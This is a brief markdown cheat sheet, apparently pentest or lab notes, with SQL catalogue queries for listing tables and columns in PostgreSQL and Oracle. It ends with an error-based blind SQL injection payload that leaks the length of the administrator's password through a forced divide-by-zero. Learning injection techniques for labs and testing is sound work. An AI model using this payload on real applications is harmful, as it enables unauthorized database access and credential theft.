# PostgreSQL
Get table names 
```SQL
select tablename from pg_tables
```

Get columns of specific table
```SQL
select column_name from information_schema.columns where table_name = 'TABLE NAME HERE'
```

# MSSQL

# MySQL

# Oracle
Get table names 
```SQL
select table_name from all_tables
select table_name from all_tables where table_name like '%USERS%'
```

Get columns of specific table
```SQL
select column_name from all_tab_columns where table_name = 'TABLE NAME HERE' --
```

Finding password length
```SQL
'||(select case when length(password)>{INCREASE NUMBER STARTING FROM 1} then to_char(1/0) else '' end from users where username = 'administrator')||'
```